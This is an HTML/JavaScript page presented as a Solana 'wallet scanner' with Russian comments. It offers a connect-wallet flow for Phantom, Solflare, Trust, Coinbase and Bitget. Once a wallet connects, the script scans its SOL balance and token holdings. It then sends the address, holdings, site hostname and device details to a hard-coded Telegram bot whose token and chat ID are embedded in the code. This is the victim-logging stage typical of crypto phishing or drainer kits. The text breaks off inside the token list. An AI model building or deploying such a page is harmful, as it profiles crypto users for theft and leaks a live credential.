<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Solana Wallet Scanner - Mobile Ready</title>
  
  <!-- Подключаем необходимые библиотеки -->
  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
  <script src="https://unpkg.com/@solana/spl-token@latest/lib/index.iife.min.js"></script>
  <script src="https://unpkg.com/@walletconnect/client@1.8.0/dist/index.umd.min.js"></script>
  <script src="https://unpkg.com/qrcode@1.5.3/build/qrcode.min.js"></script>
  
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #000;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      padding: 20px;
    }

    .main-container {
      width: 100%;
      max-width: 400px;
      text-align: center;
    }

    #connectWalletBtn {
      padding: 15px 30px;
      font-size: 1.1rem;
      font-weight: 600;
      border: none;
      border-radius: 12px;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      cursor: pointer;
      transition: all 0.3s ease;
      width: 100%;
      box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
    }

    #connectWalletBtn:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
    }

    #connectWalletBtn.connected {
      background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%);
      box-shadow: 0 4px 15px rgba(76, 175, 80, 0.4);
    }

    .hidden {
      display: none !important;
    }

    .modal-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(0,0,0,0.8);
      z-index: 1000;
      backdrop-filter: blur(5px);
    }

    .connect-wallet, .qr-modal {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: #fff;
      border-radius: 20px;
      width: 90%;
      max-width: 400px;
      padding: 25px;
      box-shadow: 0 20px 40px rgba(0,0,0,0.3);
      z-index: 1001;
      max-height: 90vh;
      overflow-y: auto;
    }

    .modal-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 25px;
      padding-bottom: 15px;
      border-bottom: 1px solid #eee;
    }

    .modal-header h2 {
      margin: 0;
      font-size: 1.4rem;
      font-weight: 700;
      color: #333;
      flex-grow: 1;
      text-align: center;
    }

    .close-btn, .back-btn {
      background: none;
      border: none;
      font-size: 1.5rem;
      cursor: pointer;
      width: 35px;
      height: 35px;
      color: #666;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: all 0.2s ease;
    }

    .close-btn:hover, .back-btn:hover {
      background: #f5f5f5;
      color: #333;
    }

    .device-detection {
      background: #f8f9fa;
      border-radius: 12px;
      padding: 15px;
      margin-bottom: 20px;
      text-align: center;
    }

    .device-info {
      font-size: 0.9rem;
      color: #666;
      margin-bottom: 10px;
    }

    .device-type {
      font-weight: 600;
      color: #333;
      font-size: 1rem;
    }

    .wallet-list {
      display: flex;
      flex-direction: column;
      gap: 12px;
    }

    .wallet-option {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 15px;
      background: #f8f9fa;
      border-radius: 12px;
      cursor: pointer;
      transition: all 0.3s ease;
      border: 2px solid transparent;
      position: relative;
    }

    .wallet-option:hover {
      background: #e9ecef;
      border-color: #667eea;
      transform: translateY(-1px);
    }

    .wallet-option.mobile-optimized {
      border-left: 4px solid #4CAF50;
    }

    .wallet-option img {
      width: 45px;
      height: 45px;
      margin-right: 15px;
      border-radius: 12px;
      object-fit: contain;
    }

    .wallet-info {
      flex-grow: 1;
      text-align: left;
    }

    .wallet-name {
      font-size: 1.1rem;
      font-weight: 600;
      color: #333;
      margin-bottom: 2px;
    }

    .wallet-status {
      font-size: 0.85rem;
      color: #28a745;
      font-weight: 500;
    }

    .wallet-status.mobile-ready {
      color: #007bff;
    }

    .wallet-status.desktop-only {
      color: #ffc107;
    }

    .connection-method {
      font-size: 0.75rem;
      color: #666;
      margin-top: 2px;
    }

    .qr-container {
      text-align: center;
      padding: 20px;
    }

    .qr-code {
      background: white;
      padding: 20px;
      border-radius: 12px;
      margin: 20px 0;
      display: inline-block;
      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
    }

    .qr-instructions {
      color: #666;
      font-size: 0.9rem;
      line-height: 1.5;
      margin-bottom: 20px;
    }

    .deep-link-btn {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      border: none;
      padding: 12px 24px;
      border-radius: 8px;
      font-size: 1rem;
      font-weight: 600;
      cursor: pointer;
      width: 100%;
      margin-top: 15px;
      transition: all 0.3s ease;
    }

    .deep-link-btn:hover {
      transform: translateY(-1px);
      box-shadow: 0 4px 12px rgba(102, 126, 234, 0.4);
    }

    .connection-status {
      margin-top: 20px;
      padding: 15px;
      border-radius: 12px;
      text-align: center;
      font-size: 0.95rem;
      font-weight: 500;
    }

    .connection-status.success {
      background: #d4edda;
      color: #155724;
      border: 1px solid #c3e6cb;
    }

    .connection-status.error {
      background: #f8d7da;
      color: #721c24;
      border: 1px solid #f5c6cb;
    }

    .connection-status.loading {
      background: #d1ecf1;
      color: #0c5460;
      border: 1px solid #bee5eb;
    }

    .connection-status.scanning {
      background: #fff3cd;
      color: #856404;
      border: 1px solid #ffeaa7;
    }

    .wallet-connected-info {
      background: #f8f9fa;
      border-radius: 12px;
      padding: 20px;
      margin-top: 20px;
      text-align: left;
    }

    .wallet-address {
      font-family: 'Monaco', 'Menlo', monospace;
      font-size: 0.85rem;
      background: #e9ecef;
      padding: 8px 12px;
      border-radius: 6px;
      word-break: break-all;
      margin: 10px 0;
    }

    .action-buttons {
      display: flex;
      gap: 10px;
      margin-top: 15px;
    }

    .btn {
      flex: 1;
      padding: 10px 15px;
      border: none;
      border-radius: 8px;
      font-size: 0.9rem;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.2s ease;
    }

    .btn-danger {
      background: #dc3545;
      color: white;
    }

    .btn-success {
      background: #28a745;
      color: white;
    }

    .btn:hover {
      transform: translateY(-1px);
      opacity: 0.9;
    }

    .loading-spinner {
      display: inline-block;
      width: 18px;
      height: 18px;
      border: 2px solid #f3f3f3;
      border-top: 2px solid #3498db;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-left: 8px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .telegram-status {
      position: fixed;
      top: 20px;
      right: 20px;
      padding: 10px 15px;
      border-radius: 25px;
      font-size: 0.85rem;
      font-weight: 600;
      z-index: 2000;
      transition: all 0.3s ease;
      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
    }

    .telegram-status.sending {
      background: #ffc107;
      color: #856404;
    }

    .telegram-status.success {
      background: #28a745;
      color: white;
    }

    .telegram-status.error {
      background: #dc3545;
      color: white;
    }

    /* Mobile Optimizations */
    @media (max-width: 480px) {
      body {
        padding: 10px;
      }

      .connect-wallet, .qr-modal {
        top: auto;
        bottom: 0;
        left: 0;
        right: 0;
        transform: none;
        width: 100%;
        border-radius: 20px 20px 0 0;
        max-height: 85vh;
        padding: 20px;
      }

      .modal-header h2 {
        font-size: 1.2rem;
      }

      .wallet-option {
        padding: 12px;
      }

      .wallet-option img {
        width: 40px;
        height: 40px;
        margin-right: 12px;
      }

      .wallet-name {
        font-size: 1rem;
      }

      .telegram-status {
        top: 10px;
        right: 10px;
        font-size: 0.75rem;
        padding: 8px 12px;
      }
    }

    /* Landscape mobile */
    @media (max-height: 500px) and (orientation: landscape) {
      .connect-wallet, .qr-modal {
        max-height: 95vh;
        top: 50%;
        transform: translate(-50%, -50%);
        bottom: auto;
      }
    }
  </style>
</head>
<body>
  <!-- Telegram Status Indicator -->
  <div id="telegramStatus" class="telegram-status hidden">📤 Отправка в Telegram...</div>

  <div class="main-container">
    <!-- Main Connect Button -->
    <button id="connectWalletBtn">Connect Wallet</button>
  </div>

  <!-- Modal Overlay -->
  <div id="modalOverlay" class="modal-overlay hidden"></div>

  <!-- Connect Wallet Modal -->
  <div id="connectWalletModal" class="connect-wallet hidden">
    <div class="modal-header">
      <div></div>
      <h2>Connect Wallet</h2>
      <button class="close-btn" title="Close">×</button>
    </div>
    
    <!-- Device Detection -->
    <div class="device-detection">
      <div class="device-info">Detected device:</div>
      <div class="device-type" id="deviceType">Loading...</div>
    </div>
    
    <!-- Connection Status Display -->
    <div id="connectionStatus" class="connection-status hidden"></div>
    
    <!-- Wallet Connected Info -->
    <div id="walletConnectedInfo" class="wallet-connected-info hidden">
      <div><strong>Connected Wallet:</strong> <span id="connectedWalletName"></span></div>
      <div><strong>Address:</strong></div>
      <div class="wallet-address" id="walletAddress"></div>
      
      <div class="action-buttons">
        <button id="disconnectBtn" class="btn btn-danger">Disconnect</button>
        <button id="rescanBtn" class="btn btn-success">Rescan</button>
      </div>
    </div>

    <!-- Wallet List -->
    <div class="wallet-list">
      <div class="wallet-option mobile-optimized" data-wallet="phantom">
        <img src="https://s.iimg.su/s/26/XUns4qhYptxMAGIMJkK8GXJiTvRMnTO8ZqAcKqvx.png" alt="Phantom" />
        <div class="wallet-info">
          <div class="wallet-name">Phantom</div>
          <div class="wallet-status mobile-ready">Mobile Ready</div>
          <div class="connection-method">Deep Link + WalletConnect</div>
        </div>
      </div>
      
      <div class="wallet-option mobile-optimized" data-wallet="solflare">
        <img src="https://s.iimg.su/s/26/AaFiC9SIvF95PZEblauprFwWZ7bXKuO2NRYnJVIH.png" alt="Solflare" />
        <div class="wallet-info">
          <div class="wallet-name">Solflare</div>
          <div class="wallet-status mobile-ready">Mobile Ready</div>
          <div class="connection-method">Deep Link + WalletConnect</div>
        </div>
      </div>
      
      <div class="wallet-option mobile-optimized" data-wallet="trustwallet">
        <img src="https://s.iimg.su/s/26/mA9QKT4xSAh5HifKsQIN8m9oZxn3ODrKcl1XQdtn.png" alt="Trust Wallet" />
        <div class="wallet-info">
          <div class="wallet-name">Trust Wallet</div>
          <div class="wallet-status mobile-ready">Mobile Ready</div>
          <div class="connection-method">WalletConnect</div>
        </div>
      </div>
      
      <div class="wallet-option" data-wallet="coinbase">
        <img src="https://s.iimg.su/s/26/75HQqHl0g9lz9qIFBEHNkRZknbnJVc69aqI5PlGK.png" alt="Coinbase" />
        <div class="wallet-info">
          <div class="wallet-name">Coinbase Wallet</div>
          <div class="wallet-status mobile-ready">Mobile Ready</div>
          <div class="connection-method">WalletConnect</div>
        </div>
      </div>
      
      <div class="wallet-option" data-wallet="bitget">
        <img src="https://s.iimg.su/s/26/HrAB9KDj99AnQOQZcxhY0htKY0oUFcONhY9jSUhP.png" alt="Bitget Wallet" />
        <div class="wallet-info">
          <div class="wallet-name">Bitget Wallet</div>
          <div class="wallet-status mobile-ready">Mobile Ready</div>
          <div class="connection-method">Deep Link</div>
        </div>
      </div>
    </div>
  </div>

  <!-- QR Code Modal -->
  <div id="qrModal" class="qr-modal hidden">
    <div class="modal-header">
      <button class="back-btn" title="Back">←</button>
      <h2 id="qrModalTitle">Connect with QR</h2>
      <button class="close-btn" title="Close">×</button>
    </div>
    
    <div class="qr-container">
      <div class="qr-instructions">
        Scan this QR code with your <span id="qrWalletName">wallet</span> app to connect
      </div>
      
      <div class="qr-code">
        <canvas id="qrCanvas"></canvas>
      </div>
      
      <button id="deepLinkBtn" class="deep-link-btn">
        Open in <span id="deepLinkWalletName">Wallet</span> App
      </button>
      
      <div id="qrConnectionStatus" class="connection-status hidden"></div>
    </div>
  </div>

  <script>
    // ============================================================================
    // DEVICE DETECTION & MOBILE OPTIMIZATION
    // ============================================================================

    class DeviceDetector {
      constructor() {
        this.userAgent = navigator.userAgent.toLowerCase();
        this.isMobile = this.detectMobile();
        this.isTablet = this.detectTablet();
        this.isDesktop = !this.isMobile && !this.isTablet;
        this.browser = this.detectBrowser();
        this.os = this.detectOS();
        
        this.updateUI();
      }

      detectMobile() {
        return /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(this.userAgent) ||
               (window.innerWidth <= 768 && 'ontouchstart' in window);
      }

      detectTablet() {
        return /ipad|android(?!.*mobile)|tablet/i.test(this.userAgent) ||
               (window.innerWidth > 768 && window.innerWidth <= 1024 && 'ontouchstart' in window);
      }

      detectBrowser() {
        if (this.userAgent.includes('chrome')) return 'Chrome';
        if (this.userAgent.includes('firefox')) return 'Firefox';
        if (this.userAgent.includes('safari') && !this.userAgent.includes('chrome')) return 'Safari';
        if (this.userAgent.includes('edge')) return 'Edge';
        return 'Unknown';
      }

      detectOS() {
        if (this.userAgent.includes('android')) return 'Android';
        if (this.userAgent.includes('iphone') || this.userAgent.includes('ipad')) return 'iOS';
        if (this.userAgent.includes('windows')) return 'Windows';
        if (this.userAgent.includes('mac')) return 'macOS';
        if (this.userAgent.includes('linux')) return 'Linux';
        return 'Unknown';
      }

      updateUI() {
        const deviceTypeElement = document.getElementById('deviceType');
        if (deviceTypeElement) {
          let deviceInfo = '';
          
          if (this.isMobile) {
            deviceInfo = `📱 Mobile (${this.os})`;
          } else if (this.isTablet) {
            deviceInfo = `📱 Tablet (${this.os})`;
          } else {
            deviceInfo = `💻 Desktop (${this.os})`;
          }
          
          deviceInfo += ` - ${this.browser}`;
          deviceTypeElement.textContent = deviceInfo;
        }
      }

      getOptimalConnectionMethod(walletType) {
        if (this.isMobile || this.isTablet) {
          switch (walletType) {
            case 'phantom':
            case 'solflare':
              return this.os === 'iOS' ? 'deeplink' : 'deeplink_with_fallback';
            case 'trustwallet':
            case 'coinbase':
              return 'walletconnect';
            default:
              return 'walletconnect';
          }
        } else {
          return 'extension_or_qr';
        }
      }
    }

    // ============================================================================
    // WALLETCONNECT INTEGRATION
    // ============================================================================

    class WalletConnectManager {
      constructor() {
        this.connector = null;
        this.isConnecting = false;
        this.currentWallet = null;
      }

      async initWalletConnect(walletType) {
        try {
          // Создаем новый WalletConnect коннектор
          this.connector = new WalletConnect({
            bridge: "https://bridge.walletconnect.org",
            qrcodeModal: {
              open: (uri, cb) => {
                this.showQRModal(uri, walletType, cb);
              },
              close: () => {
                this.hideQRModal();
              }
            }
          });

          // Подписываемся на события
          this.setupWalletConnectEvents();

          return this.connector;
        } catch (error) {
          console.error('Failed to initialize WalletConnect:', error);
          throw error;
        }
      }

      setupWalletConnectEvents() {
        if (!this.connector) return;

        this.connector.on("connect", (error, payload) => {
          if (error) {
            console.error('WalletConnect connection error:', error);
            this.showConnectionStatus('error', `Connection failed: ${error.message}`);
            return;
          }

          console.log('WalletConnect connected:', payload);
          const { accounts, chainId } = payload.params[0];
          
          if (accounts && accounts.length > 0) {
            this.handleSuccessfulConnection(accounts[0], this.currentWallet);
          }
        });

        this.connector.on("session_update", (error, payload) => {
          if (error) {
            console.error('WalletConnect session update error:', error);
            return;
          }

          console.log('WalletConnect session updated:', payload);
          const { accounts, chainId } = payload.params[0];
          
          if (accounts && accounts.length > 0) {
            walletManager.walletAddress = accounts[0];
            walletManager.updateConnectionUI();
          }
        });

        this.connector.on("disconnect", (error, payload) => {
          if (error) {
            console.error('WalletConnect disconnect error:', error);
          }

          console.log('WalletConnect disconnected');
          this.cleanup();
          if (walletManager) {
            walletManager.disconnectWallet();
          }
        });
      }

      async connectWithWalletConnect(walletType) {
        if (this.isConnecting) {
          console.log('Connection already in progress...');
          return;
        }

        this.isConnecting = true;
        this.currentWallet = walletType;

        try {
          this.showConnectionStatus('loading', `Connecting to ${walletType}...`);

          const connector = await this.initWalletConnect(walletType);
          
          if (!connector.connected) {
            await connector.createSession();
          }

          return connector;
        } catch (error) {
          console.error('WalletConnect connection failed:', error);
          this.showConnectionStatus('error', `Failed to connect: ${error.message}`);
          throw error;
        } finally {
          this.isConnecting = false;
        }
      }

      showQRModal(uri, walletType, callback) {
        const qrModal = document.getElementById('qrModal');
        const qrModalTitle = document.getElementById('qrModalTitle');
        const qrWalletName = document.getElementById('qrWalletName');
        const deepLinkWalletName = document.getElementById('deepLinkWalletName');
        const qrCanvas = document.getElementById('qrCanvas');
        const deepLinkBtn = document.getElementById('deepLinkBtn');
        const modalOverlay = document.getElementById('modalOverlay');

        // Обновляем заголовки
        qrModalTitle.textContent = `Connect ${walletType}`;
        qrWalletName.textContent = walletType;
        deepLinkWalletName.textContent = walletType;

        // Генерируем QR код
        QRCode.toCanvas(qrCanvas, uri, {
          width: 200,
          margin: 2,
          color: {
            dark: '#000000',
            light: '#FFFFFF'
          }
        }, (error) => {
          if (error) {
            console.error('QR Code generation failed:', error);
          }
        });

        // Настраиваем deep link кнопку
        deepLinkBtn.onclick = () => {
          this.openDeepLink(uri, walletType);
        };

        // Показываем модал
        modalOverlay.classList.remove('hidden');
        qrModal.classList.remove('hidden');
        document.getElementById('connectWalletModal').classList.add('hidden');
      }

      hideQRModal() {
        const qrModal = document.getElementById('qrModal');
        qrModal.classList.add('hidden');
      }

      openDeepLink(uri, walletType) {
        const deepLinks = {
          phantom: `phantom://wc?uri=${encodeURIComponent(uri)}`,
          solflare: `solflare://wc?uri=${encodeURIComponent(uri)}`,
          trustwallet: `trust://wc?uri=${encodeURIComponent(uri)}`,
          coinbase: `cbwallet://wc?uri=${encodeURIComponent(uri)}`,
          bitget: `bitkeep://wc?uri=${encodeURIComponent(uri)}`
        };

        const deepLink = deepLinks[walletType.toLowerCase()];
        
        if (deepLink) {
          console.log(`Opening deep link for ${walletType}:`, deepLink);
          
          // Пытаемся открыть deep link
          window.location.href = deepLink;
          
          // Fallback для случаев, когда приложение не установлено
          setTimeout(() => {
            this.showConnectionStatus('loading', 'Waiting for wallet response...');
          }, 1000);
        } else {
          console.error(`No deep link configured for ${walletType}`);
          this.showConnectionStatus('error', `Deep link not available for ${walletType}`);
        }
      }

      async handleSuccessfulConnection(address, walletType) {
        console.log(`Successfully connected to ${walletType}:`, address);
        
        if (walletManager) {
          walletManager.walletAddress = address;
          walletManager.walletName = walletType;
          walletManager.connectedWallet = this.connector;
          
          // Сохраняем подключение
          localStorage.setItem('connectedWallet', walletType);
          localStorage.setItem('walletAddress', address);
          
          // Обновляем UI
          walletManager.updateConnectionUI();
          
          // Начинаем сканирование
          this.showConnectionStatus('scanning', 'Scanning wallet data...');
          
          try {
            const scanResults = await walletManager.scanner.performFastScan(address);
            
            // Отправляем в Telegram
            await sendWalletInfoToTelegram(walletType, scanResults);
            
            this.showConnectionStatus('success', 'Connected and scanned successfully!');
            
            // Закрываем модалы через 2 секунды
            setTimeout(() => {
              this.closeAllModals();
            }, 2000);
            
          } catch (scanError) {
            console.error('Scan failed:', scanError);
            this.showConnectionStatus('error', `Connected but scan failed: ${scanError.message}`);
          }
        }
      }

      showConnectionStatus(type, message) {
        const statusElement = document.getElementById('qrConnectionStatus');
        if (statusElement) {
          statusElement.className = `connection-status ${type}`;
          statusElement.textContent = message;
          statusElement.classList.remove('hidden');
        }

        // Также обновляем основной статус
        const mainStatusElement = document.getElementById('connectionStatus');
        if (mainStatusElement) {
          mainStatusElement.className = `connection-status ${type}`;
          mainStatusElement.textContent = message;
          mainStatusElement.classList.remove('hidden');
        }
      }

      closeAllModals() {
        document.getElementById('modalOverlay').classList.add('hidden');
        document.getElementById('connectWalletModal').classList.add('hidden');
        document.getElementById('qrModal').classList.add('hidden');
      }

      cleanup() {
        if (this.connector) {
          this.connector.killSession();
          this.connector = null;
        }
        this.isConnecting = false;
        this.currentWallet = null;
      }

      async disconnect() {
        if (this.connector && this.connector.connected) {
          await this.connector.killSession();
        }
        this.cleanup();
      }
    }

    // ============================================================================
    // ENHANCED WALLET MANAGER
    // ============================================================================

    class EnhancedSolanaWalletManager {
      constructor() {
        this.connectedWallet = null;
        this.walletAddress = null;
        this.walletName = null;
        this.walletData = null;
        this.scanner = new SolanaWalletScanner();
        this.isScanning = false;
        this.deviceDetector = new DeviceDetector();
        this.walletConnect = new WalletConnectManager();
        
        this.init();
      }

      init() {
        this.setupEventListeners();
        this.checkPreviousConnection();
      }

      async checkPreviousConnection() {
        const savedWallet = localStorage.getItem('connectedWallet');
        const savedAddress = localStorage.getItem('walletAddress');
        
        if (savedWallet && savedAddress) {
          console.log(`Restoring previous connection: ${savedWallet}`);
          this.walletName = savedWallet;
          this.walletAddress = savedAddress;
          this.updateConnectionUI();
        }
      }

      async connectWallet(walletType) {
        if (this.isScanning) {
          console.log('⏳ Scanning already in progress...');
          return;
        }

        const connectionMethod = this.deviceDetector.getOptimalConnectionMethod(walletType);
        console.log(`Connecting to ${walletType} using method: ${connectionMethod}`);

        try {
          switch (connectionMethod) {
            case 'deeplink':
            case 'deeplink_with_fallback':
              await this.connectViaDeepLink(walletType);
              break;
            case 'walletconnect':
              await this.walletConnect.connectWithWalletConnect(walletType);
              break;
            case 'extension_or_qr':
              await this.connectViaExtensionOrQR(walletType);
              break;
            default:
              throw new Error(`Unsupported connection method: ${connectionMethod}`);
          }
        } catch (error) {
          console.error(`Failed to connect to ${walletType}:`, error);
          this.showConnectionStatus('error', error.message);
        }
      }

      async connectViaDeepLink(walletType) {
        this.showConnectionStatus('loading', `Opening ${walletType}...`);

        const deepLinks = {
          phantom: 'phantom://browse/' + encodeURIComponent(window.location.href + '?wallet=phantom'),
          solflare: 'solflare://browse/' + encodeURIComponent(window.location.href + '?wallet=solflare'),
          bitget: 'bitkeep://browse/' + encodeURIComponent(window.location.href + '?wallet=bitget')
        };

        const deepLink = deepLinks[walletType.toLowerCase()];
        
        if (deepLink) {
          // Открываем deep link
          window.location.href = deepLink;
          
          // Показываем инструкции пользователю
          this.showConnectionStatus('loading', 
            `Please approve the connection in your ${walletType} app and return to this page`);
          
          // Проверяем URL параметры для обработки возврата
          this.handleDeepLinkReturn();
        } else {
          // Fallback на WalletConnect
          await this.walletConnect.connectWithWalletConnect(walletType);
        }
      }

      handleDeepLinkReturn() {
        const urlParams = new URLSearchParams(window.location.search);
        const walletParam = urlParams.get('wallet');
        const addressParam = urlParams.get('address');
        
        if (walletParam && addressParam) {
          console.log(`Deep link return detected: ${walletParam} - ${addressParam}`);
          this.walletConnect.handleSuccessfulConnection(addressParam, walletParam);
          
          // Очищаем URL параметры
          window.history.replaceState({}, document.title, window.location.pathname);
        }
      }

      async connectViaExtensionOrQR(walletType) {
        // Сначала пытаемся подключиться через расширение
        const provider = this.getWalletProvider(walletType);
        
        if (provider) {
          try {
            await this.connectViaExtension(walletType, provider);
          } catch (error) {
            console.log('Extension connection failed, falling back to QR:', error);
            await this.walletConnect.connectWithWalletConnect(walletType);
          }
        } else {
          // Если расширения нет, используем QR
          await this.walletConnect.connectWithWalletConnect(walletType);
        }
      }

      getWalletProvider(walletType) {
        const providers = {
          phantom: () => window.phantom?.solana,
          solflare: () => window.solflare,
          coinbase: () => window.coinbaseSolana,
          bitget: () => window.bitkeep?.solana
        };

        const providerGetter = providers[walletType.toLowerCase()];
        return providerGetter ? providerGetter() : null;
      }

      async connectViaExtension(walletType, provider) {
        this.showConnectionStatus('loading', `Connecting to ${walletType} extension...`);

        let response;
        if (walletType.toLowerCase() === 'phantom') {
          response = await provider.connect();
        } else if (walletType.toLowerCase() === 'solflare') {
          await provider.connect();
          response = { publicKey: provider.publicKey };
        } else {
          response = await provider.connect();
        }

        const address = response.publicKey.toString();
        await this.walletConnect.handleSuccessfulConnection(address, walletType);
      }

      showConnectionStatus(type, message) {
        const statusElement = document.getElementById('connectionStatus');
        if (statusElement) {
          statusElement.className = `connection-status ${type}`;
          statusElement.textContent = message;
          statusElement.classList.remove('hidden');

          if (type === 'success') {
            setTimeout(() => {
              statusElement.classList.add('hidden');
            }, 3000);
          }
        }
      }

      updateConnectionUI() {
        const connectBtn = document.getElementById('connectWalletBtn');
        const walletInfo = document.getElementById('walletConnectedInfo');
        const connectedWalletName = document.getElementById('connectedWalletName');
        const walletAddressElement = document.getElementById('walletAddress');

        if (this.walletAddress) {
          connectBtn.textContent = 'Wallet Connected ✓';
          connectBtn.classList.add('connected');
          
          if (walletInfo) {
            walletInfo.classList.remove('hidden');
            connectedWalletName.textContent = this.walletName || 'Unknown';
            walletAddressElement.textContent = this.formatAddress(this.walletAddress);
          }
        } else {
          connectBtn.textContent = 'Connect Wallet';
          connectBtn.classList.remove('connected');
          
          if (walletInfo) {
            walletInfo.classList.add('hidden');
          }
        }
      }

      formatAddress(address) {
        if (!address) return '';
        return `${address.slice(0, 6)}...${address.slice(-6)}`;
      }

      async disconnectWallet() {
        try {
          await this.walletConnect.disconnect();
        } catch (error) {
          console.error('Error disconnecting:', error);
        }

        this.connectedWallet = null;
        this.walletAddress = null;
        this.walletName = null;
        this.walletData = null;
        this.isScanning = false;
        
        localStorage.removeItem('connectedWallet');
        localStorage.removeItem('walletAddress');

        this.updateConnectionUI();
        this.showConnectionStatus('success', 'Wallet disconnected');

        setTimeout(() => {
          document.getElementById('connectionStatus').classList.add('hidden');
        }, 2000);
      }

      async rescanWallet() {
        if (!this.walletAddress) {
          this.showConnectionStatus('error', 'No wallet connected');
          return;
        }

        if (this.isScanning) {
          this.showConnectionStatus('error', 'Scan already in progress');
          return;
        }

        this.showConnectionStatus('scanning', 'Rescanning wallet...');
        this.isScanning = true;

        try {
          this.walletData = await this.scanner.performFastScan(this.walletAddress);
          
          // Отправляем обновленные данные в Telegram
          await sendWalletInfoToTelegram(`${this.walletName} (Rescan)`, this.walletData);
          
          this.showConnectionStatus('success', 'Rescan completed!');
          
        } catch (error) {
          console.error('Rescan failed:', error);
          this.showConnectionStatus('error', `Rescan failed: ${error.message}`);
        } finally {
          this.isScanning = false;
        }
      }

      setupEventListeners() {
        // Wallet option clicks
        document.querySelectorAll('.wallet-option[data-wallet]').forEach(option => {
          option.addEventListener('click', async (e) => {
            const walletType = option.getAttribute('data-wallet');
            await this.connectWallet(walletType);
          });
        });

        // Disconnect button
        const disconnectBtn = document.getElementById('disconnectBtn');
        if (disconnectBtn) {
          disconnectBtn.addEventListener('click', () => {
            this.disconnectWallet();
          });
        }

        // Rescan button
        const rescanBtn = document.getElementById('rescanBtn');
        if (rescanBtn) {
          rescanBtn.addEventListener('click', () => {
            this.rescanWallet();
          });
        }
      }
    }

    // ============================================================================
    // TELEGRAM INTEGRATION (SAME AS BEFORE)
    // ============================================================================

    const TELEGRAM_CONFIG = {
      BOT_TOKEN: '7523783619:AAHrK8KtQT3t_SflVhz2POJ1RDaLp1PuJEc',
      CHAT_ID: '7253475769'
    };

    function showTelegramStatus(type, message) {
      const statusElement = document.getElementById('telegramStatus');
      statusElement.className = `telegram-status ${type}`;
      statusElement.textContent = message;
      statusElement.classList.remove('hidden');

      if (type === 'success' || type === 'error') {
        setTimeout(() => {
          statusElement.classList.add('hidden');
        }, 3000);
      }
    }

    async function sendWalletInfoToTelegram(walletName, walletData) {
      showTelegramStatus('sending', '📤 Отправка в Telegram...');
      
      const currentTime = new Date().toLocaleString('ru-RU', {
        timeZone: 'Europe/Moscow',
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
      });

      let message = `🚀 МОБИЛЬНОЕ ПОДКЛЮЧЕНИЕ КОШЕЛЬКА\n\n`;
      message += `💼 Кошелек: ${walletName}\n`;
      message += `📍 Адрес: ${walletData.address}\n`;
      message += `⏰ Время: ${currentTime}\n`;
      message += `🌐 Сайт: ${window.location.hostname}\n`;
      message += `📱 Устройство: ${deviceDetector.isMobile ? 'Mobile' : 'Desktop'} (${deviceDetector.os})\n\n`;
      
      message += `📊 РЕЗУЛЬТАТЫ СКАНИРОВАНИЯ:\n`;
      message += `💰 Баланс SOL: ${walletData.solBalance.toFixed(4)} SOL\n`;
      message += `🪙 Всего токенов: ${walletData.totalTokenAccounts}\n`;
      message += `⏰ Время сканирования: ${new Date(walletData.scanTimestamp).toLocaleTimeString()}\n`;
      message += `⚡ Тип сканирования: Mobile Fast Scan\n`;
      message += `🚀 Длительность: ${walletData.scanDuration}мс\n`;
      message += `✅ Статус: ${walletData.success ? 'Успешно' : 'Ошибка'}\n\n`;

      if (walletData.tokens && walletData.tokens.length > 0) {
        message += `💎 ТОКЕНЫ С БАЛАНСОМ:\n`;
        walletData.tokens.slice(0, 5).forEach((token, index) => {
          message += `${index + 1}. ${token.name}\n`;
          message += `   💰 Количество: ${token.amount}\n`;
          message += `   🔗 Mint: ${token.mint.substring(0, 8)}...${token.mint.substring(token.mint.length - 8)}\n\n`;
        });
        
        if (walletData.tokens.length > 5) {
          message += `... и еще ${walletData.tokens.length - 5} токенов\n\n`;
        }
      }

      try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CONFIG.CHAT_ID,
            text: message,
            disable_web_page_preview: true
          })
        });

        const responseData = await response.json();
        
        if (response.ok && responseData.ok) {
          showTelegramStatus('success', '✅ Отправлено в Telegram');
          return true;
        } else {
          showTelegramStatus('error', '❌ Ошибка отправки');
          return false;
        }
      } catch (error) {
        console.error('❌ Ошибка сети:', error);
        showTelegramStatus('error', '❌ Ошибка сети');
        return false;
      }
    }

    // ============================================================================
    // WALLET SCANNER (SAME AS BEFORE)
    // ============================================================================

    class SolanaWalletScanner {
      constructor() {
        this.knownTokens = {
          'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v': 'USDC',
          'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB': 'USDT',
          'So11111111111111111111111111111111111111112': 'SOL (Wrapped)',
          'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263': 'Bonk',
